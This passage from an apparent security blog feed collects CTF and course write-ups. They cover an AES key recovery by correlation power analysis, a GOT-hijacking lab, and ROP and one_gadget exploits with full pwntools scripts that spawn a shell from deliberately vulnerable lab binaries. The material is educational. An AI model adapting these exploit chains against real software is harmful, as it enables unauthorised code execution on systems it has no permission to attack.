&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;sig2 = (&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig2&lt;span style="color:#f92672">.&lt;/span>r&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>sig2&lt;span style="color:#f92672">.&lt;/span>s&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">)&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># P = (70427896289635684269185763735464004880272487387417064603929487585697794861713, 83106938517126976838986116917338443942453391221542116900720022828358221631968)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sig1 = (26150478759659181410183574739595997895638116875172347795980556499925372918857, 50639168022751577246163934860133616960953696675993100806612269138066992704236)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sig2 = (8256687378196792904669428303872036025324883507048772044875872623403155644190, 90323515158120328162524865800363952831516312527470472160064097576156608261906)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto 0x13(2023 HW - Power Analysis)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto-0x132023-hw---power-analysis/</guid><description>&lt;h1 id="simple-crypto-0x132023-hw---power-analysis">
 Simple Crypto 0x13(2023 HW - Power Analysis)
 &lt;a class="anchor" href="#simple-crypto-0x132023-hw---power-analysis">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/Q-gaGLJpJHc?si=DZgJm62AnoPHWiZF&amp;amp;t=5433"> [edu-ctf 2023] week04 - crypto3 [1:30:36]&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>json file recorded by TA&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題全部都是刻出來的，也包含算correlation coefficient，後面才知道numpy有這東西，但反正根據老師上課的作法一步一步跟著做是絕對沒有問題的，包含以下步驟:&lt;/p>
&lt;ol>
&lt;li>Preprocessing
也就是把pt, ct, pm都按照簡報上的方式排列(各個trace的第一個byte都蒐集在一起，第二個byte都蒐集再一起&amp;hellip;)&lt;/li>
&lt;li>計算和sbox key XOR的結果&lt;/li>
&lt;li>查表sbox&lt;/li>
&lt;li>計算hamming weight model&lt;/li>
&lt;li>計算和trace的correlation coefficient&lt;/li>
&lt;li>看哪一個結果的數值最大，並把index結果記錄下來算它的ascii&lt;/li>
&lt;li>repeat以上操作後共可得16 bytes的flag&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>加速的方法:
可以把整個trace的圖片plot出來看看，會發現題目給的json file是把整段加密的過程記錄下來，所以我們可以只取前一兩百個point就可以完成key的還原&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import json
from tqdm import trange
import numpy as np
import copy
from string import ascii_letters, digits
from numpy import corrcoef

jsonFile = open(&amp;#39;./Crypto/HW3/traces.json&amp;#39;, &amp;#39;r&amp;#39;)
j = json.load(jsonFile)

s_box = [
 [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76],
 [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0],
 [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15],
 [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75],
 [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84],
 [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF],
 [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8],
 [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2],
 [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73],
 [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB],
 [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79],
 [0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08],
 [0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A],
 [0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E],
 [0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF],
 [0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
]

def data_preprocess(json_data):
 pt_col = []
 ct_col = []
 trace_col = []
 for bytes in range(16):
 tmp_pt_col = []
 tmp_ct_col = []
 for trace_idx in range(len(json_data)):
 tmp_pt_col.append(json_data[trace_idx][&amp;#39;pt&amp;#39;][bytes])
 tmp_ct_col.append(json_data[trace_idx][&amp;#39;ct&amp;#39;][bytes])
 pt_col.append(tmp_pt_col)
 ct_col.append(tmp_ct_col)
 for point in range(len(json_data[0][&amp;#39;pm&amp;#39;])):
 tmp_trace_col = []
 for trace_idx in range(len(json_data)):
 tmp_trace_col.append(json_data[trace_idx][&amp;#39;pm&amp;#39;][point])
 trace_col.append(tmp_trace_col)
 
 return pt_col, ct_col, trace_col

def sbox_preprocess(pt_col):
 sbox_result_tmp = []
 for sbox_key in range(256): # 總共有256個sbox key
 tmp = []
 for trace in range(len(pt_col)): # 有50個trace
 tmp.append(pt_col[trace] ^ sbox_key)
 sbox_result_tmp.append(tmp)
 return sbox_result_tmp

def choose_sbox(sbox_result_tmp):
 sbox_result = copy.deepcopy(sbox_result_tmp)
 for sbox_key in range(256):
 for trace in range(50):
 hex_value = &amp;#39;{0:0&amp;gt;2x}&amp;#39;.format(sbox_result_tmp[sbox_key][trace])
 x, y = hex_value[0], hex_value[1]
 sbox_result[sbox_key][trace] = s_box[int(x, 16)][int(y, 16)]
 
 return sbox_result

def cal_hamming_weight(sbox_result_col):
 hw_model = copy.deepcopy(sbox_result_col)
 for i in range(len(sbox_result_col)): # 256
 for j in range(len(sbox_result_col[i])): # 50
 hw_model[i][j] = bin(sbox_result_col[i][j]).count(&amp;#39;1&amp;#39;)
 
 return hw_model

def cal_correlation(hw_model_col_result, trace_col):
 correlation_result = []
 for i in (ascii_letters + digits).encode():#trange(len(hw_model_col_result)): &amp;lt;- 加速的部分
 for j in range(biggest_length):
 correlation_result.append(corrcoef(hw_model_col_result[i], trace_col[j])[0, -1])
 return correlation_result
 
def run_pearson_correlation(x, y):
 mean_x = np.mean(x)
 mean_y = np.mean(y)
 
 covariance = np.sum((x - mean_x) * (y - mean_y))
 
 std_dev_x = np.sqrt(np.sum((x - mean_x)**2))
 std_dev_y = np.sqrt(np.sum((y - mean_y)**2))
 
 correlation = covariance / (std_dev_x * std_dev_y)
 
 return correlation

def display_pt(offset:int, data_offset = (0, len(j[0][&amp;#34;pm&amp;#34;]))):
 plt.plot(range(data_offset[0], data_offset[1]), j[offset][&amp;#34;pm&amp;#34;][data_offset[0]:data_offset[1]])
 plt.savefig(fname=&amp;#34;pt_&amp;#34; + str(offset) + &amp;#34;.jpg&amp;#34;)
 plt.clf()

# display_pt(0, (0, 95))
# display_pt(0)
pt_col, ct_col, trace_col = data_preprocess(j)
flag = &amp;#39;&amp;#39;
biggest_length = 95# len(trace_col)
for idx in trange(16):
 sbox_preprocess_result = sbox_preprocess(pt_col[idx])
 choose_sbox_result = choose_sbox(sbox_preprocess_result)
 hw_model_col_result = cal_hamming_weight(choose_sbox_result)
 correlation_result = cal_correlation(hw_model_col_result, trace_col)
 key_idx = correlation_result.index(max(correlation_result))
 flag += (ascii_letters + digits)[key_idx // biggest_length]
 # from Crypto.Util.number import long_to_bytes
 # flag += long_to_bytes(key_idx // biggest_length).decode(&amp;#34;cp437&amp;#34;)

print(&amp;#39;The key of AES is: FLAG{&amp;#39; + flag + &amp;#39;}&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>有嘗試過只選擇常見可使用的字元也就是&lt;code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&lt;/code>，以及trace只選擇前95個data，也可以正常解析出AES key並且算的更快(大約快77倍左右)&lt;/p></description></item><item><title>Simple PWN - 0x06(GOT hijacking/Lab - `got2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x06got-hijacking_lab---got2win/</guid><description>&lt;h1 id="simple-pwn---0x06got-hijackinglab---got2win">
 Simple PWN - 0x06(GOT hijacking/Lab - &lt;code>got2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x06got-hijackinglab---got2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="got-background">
 GOT Background
 &lt;a class="anchor" href="#got-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=4423">Lecture Vid. - Pwn week1&lt;/a>
&lt;a href="https://youtu.be/PBgHHWtjtFA?t=6017">NTUSTISC - Pwn Basic 2 [2019.03.19]&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x30];

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 int fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 read(fd, flag, 0x30);
 close(fd);
 write(1, &amp;#34;Good luck !\n&amp;#34;, 13);

 unsigned long addr = 0;
 printf(&amp;#34;Overwrite addr: &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;addr);
 printf(&amp;#34;Overwrite 8 bytes value: &amp;#34;);
 read(0, (void *) addr, 0x8);

 printf(&amp;#34;Give me fake flag: &amp;#34;);
 int nr = read(1, flag, 0x30);
 if (nr &amp;lt;= 0)
 exit(1);
 flag[nr - 1] = &amp;#39;\0&amp;#39;;
 printf(&amp;#34;This is your flag: ctf{%s}... Just kidding :)\n&amp;#34;, flag);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x07(ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x07rop/</guid><description>&lt;h1 id="simple-pwn---0x07rop">
 Simple PWN - 0x07(ROP)
 &lt;a class="anchor" href="#simple-pwn---0x07rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is very similar to normal &lt;code>BOF&lt;/code>.&lt;/li>
&lt;li>If a sample code that doesn&amp;rsquo;t have a backdoor function and you cannot input a backdoor function as well, then you can use some code segment to merge a shellcode.&lt;/li>
&lt;li>Therefore, the main idea is use some &lt;code>&amp;lt;operation&amp;gt;;ret&lt;/code> pattern segment to overlap stack.
&lt;img src="https://imgur.com/YGarADK.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-c!=1" data-lang="c!=1">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0)
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Here is your \&amp;#34;/bin/sh\&amp;#34;: %p\n&amp;#34;, &amp;#34;/bin/sh&amp;#34;);
 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x400);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>At line &lt;code>11&lt;/code>, &lt;code>%p&lt;/code> means pointer of &lt;code>/bin/sh&lt;/code> string.&lt;/li>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection. In addition, please use &lt;code>-static&lt;/code> command to compile library at compile time, so that we can get &lt;code>ROP gadget&lt;/code> more easily.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o rop rop.c -zexecstack -no-pie -fno-stack-protector -z norelro -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we can observe the program has overflow(very important), but has no other backdoor method can access or global variable can write shellcode. Then we can consider to use &lt;code>ROP gadget&lt;/code> to construct chain.&lt;/li>
&lt;li>Second, we use &lt;code>ROPgadget&lt;/code> to find suitable gadget
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --multibr --binary rop &amp;gt; rop_gadget
$ vim rop_gadget
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/IzeTvgK.png" alt="" />
&lt;img src="https://imgur.com/PlA5C8B.png" alt="" />
&lt;img src="https://imgur.com/zg28Pti.png" alt="" />
&lt;img src="https://imgur.com/WDS0HUh.png" alt="" />
&lt;img src="https://imgur.com/dEh7b5n.png" alt="reference link" />
&lt;ul>
&lt;li>Note that, you may consider that &lt;code>pop rdx ; pop rbx ; ret&lt;/code> is not what we want. We just want &lt;code>pop rdx ; ret&lt;/code>. Therefore, we have to push one more value for &lt;code>pop rbx ;&lt;/code> instruction.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we can construct our payload:
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./rop&amp;#39;)

r.recvuntil(&amp;#39;Here is your &amp;#34;/bin/sh&amp;#34;: &amp;#39;)
binsh = int(r.recvline()[:-1], 16)
info(f&amp;#34;binsh: {hex(binsh)}&amp;#34;)

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, &lt;code>r.recvline()[:-1]&lt;/code> is &lt;code>b'0x498004'&lt;/code> and we must pop to &lt;code>%rdi&lt;/code> at line &lt;code>17&lt;/code> below.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then we can combine them together using &lt;a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat">flat method&lt;/a>. It&amp;rsquo;ll flat the address with &lt;strong>length 8 bytes&lt;/strong>.
&lt;pre tabindex="0">&lt;code class="language-python!=16" data-lang="python!=16">ROP = flat(
 pop_rdi_ret, binsh,
 pop_rsi_ret, 0,
 pop_rdx_ret, 0, 0,
 pop_rax_ret, 0x3b,
 syscall,
)

gdb.attach(r)
r.sendafter(&amp;#34;Give me your ROP: &amp;#34;, b&amp;#39;a&amp;#39; * 0x18 + ROP)

r.interactive()
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/dk0Z2mw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>This is totally the same as our hypothesis.
&lt;img src="https://imgur.com/OjcDNbu.png" alt="" />&lt;/li>
&lt;li>We can see that all parameters are ready
&lt;img src="https://imgur.com/xXx7HRQ.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=1239">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=6712">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x08(one_gadget with ROP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x08one_gadget-with-rop/</guid><description>&lt;h1 id="simple-pwn---0x08one_gadget-with-rop">
 Simple PWN - 0x08(one_gadget with ROP)
 &lt;a class="anchor" href="#simple-pwn---0x08one_gadget-with-rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="one_gadget-background">
 one_gadget background
 &lt;a class="anchor" href="#one_gadget-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10226977">Day25: [Misc] 我從來沒想過我會害怕寫 code&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>原理是在 &lt;code>glibc&lt;/code> 裡面有很多會透過 &lt;code>execve&lt;/code> 執行 &lt;code>/bin/sh&lt;/code>、再調用外部系統指令的 assembly，當 explolit 已經得知 &lt;code>libc&lt;/code> 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數&lt;/p>&lt;/blockquote>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IOBNF, 0);

 char s[0x10];

 printf(&amp;#34;Your libc: %p&amp;#34;, printf);
 read(0, s, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use &lt;code>ROP&lt;/code> to get shell.&lt;/li>
&lt;li>Note that, it must be a dynamic library, so DO NOT use &lt;code>-static&lt;/code> to compile it.
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>First, we use &lt;a href="https://shengyu7697.github.io/linux-ldd/">&lt;font color="FF0000">&lt;code>ldd&lt;/code>&lt;/font>&lt;/a> command to find what library the program will use.
&lt;img src="https://imgur.com/ycRb8Tv.png" alt="" />&lt;/li>
&lt;li>In addition, we use &lt;code>one_gadget&lt;/code> command to find &lt;code>execvs&lt;/code>
&lt;ul>
&lt;li>Note that, how to use it can refer to &lt;a href="https://blog.csdn.net/weixin_43092232/article/details/105085880">one_gadget用法&lt;/a>&lt;/li>
&lt;li>We use &lt;code>0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)&lt;/code> as our method
&lt;img src="https://imgur.com/Y7BBH5J.png" alt="" />
&lt;ul>
&lt;li>&lt;font color="FF0000">Note:&lt;/font> it has 3 constraint so that we can get the shell&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">address rbp-0x78 is writable
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Then, we use &lt;code>one_gadget&lt;/code> command to get &lt;code>ROP&lt;/code> chain
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">ROPgadget --binary one_gadget_with_rop --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
vim one_gadget
&lt;/code>&lt;/pre>You can see that because we didn&amp;rsquo;t compile with library, the gadget that we may can use is very few.
&lt;img src="https://imgur.com/DuGINHL.png" alt="" />
The solution is using the gadget that &lt;code>libc&lt;/code> have:
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;#34;pop|ret&amp;#34; &amp;gt; one_gadget
$ vim one_gadget
&lt;/code>&lt;/pre>We must satisfied one_gadget constraint. &lt;code>0x90529&lt;/code> and &lt;code>0x2be51&lt;/code> are the offset of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>. Therefore, if we want to call these gadget, &lt;font color="FF0000">we must find out the real base address of &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code>&lt;/font>.
&lt;img src="https://imgur.com/3h5PqcO.png" alt="" />
&lt;img src="https://imgur.com/Z2bBbhJ.png" alt="" />&lt;/li>
&lt;li>Because, &lt;code>ASLR&lt;/code> is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the &lt;code>printf&lt;/code> address in &lt;code>/lib/x86_64-linux-gnu/libc.so.6&lt;/code> → &lt;font color="FF0000">&lt;code>0x7ffff7def770&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/nuYGx24.png" alt="" />
Used &lt;code>gdb&lt;/code> can find the current address of library → &lt;font color="FF0000">&lt;code>0x7ffff7d8f000&lt;/code>&lt;/font>
&lt;img src="https://imgur.com/Et3r2hI.png" alt="" />
Then we can know the offset and construct apart of payload as below
$$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from pwn import *
import sys

context.arch = &amp;#39;amd64&amp;#39;

r = process(&amp;#39;./one_gadget_with_rop&amp;#39;)

r.recvuntil(&amp;#34;Your libc: &amp;#34;)
libc = int(r.recv(14), 16) - 0x60770
info(f&amp;#34;libc: {hex(libc)}&amp;#34;)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>And prepare our gadget:
&lt;pre tabindex="0">&lt;code class="language-python!=11" data-lang="python!=11">pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Construct whole payload with considering the constraint:
&lt;pre tabindex="0">&lt;code class="language-python!=13" data-lang="python!=13">r.send(b&amp;#39;a&amp;#39;*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
r.interactivae()
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>b'a'*0x10&lt;/code> is for &lt;code>$rsi&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(0x404000)&lt;/code> is an arbitrary writable and readable address for &lt;code>$rbp-0x78&lt;/code> one of the constraint of one_gadget&lt;/li>
&lt;li>&lt;code>p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)&lt;/code> is what we did in &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs">last lecture&lt;/a> of &lt;code>ROP&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(libc+0xebcf8)&lt;/code> is the one_gadget that we choose at the beginning.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/iIETaBy.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://shengyu7697.github.io/linux-ldd/">Linux ldd 查看執行檔執行時需要哪些 library&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x09(stack pivoting)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</guid><description>&lt;h1 id="simple-pwn---0x09stack-pivoting">
 Simple PWN - 0x09(stack pivoting)
 &lt;a class="anchor" href="#simple-pwn---0x09stack-pivoting">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="stack-pivoting-background">
 Stack Pivoting background
 &lt;a class="anchor" href="#stack-pivoting-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=6865">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=7898">Pwn week1&lt;/a>
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to &lt;a href="https://youtu.be/5D7tvxpSUUM?t=9543">Binary Exploitation (Pwn)&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char name[0x80]

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Give me your name: &amp;#34;);
 read(0, name, 0x80);

 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x20);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>You can observe that it has not much stack buffer overflow can use, but it has global variable &lt;code>name&lt;/code> with space &lt;code>0x80&lt;/code>(can be another stack)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;font color="FF0000">Note that&lt;/font>:
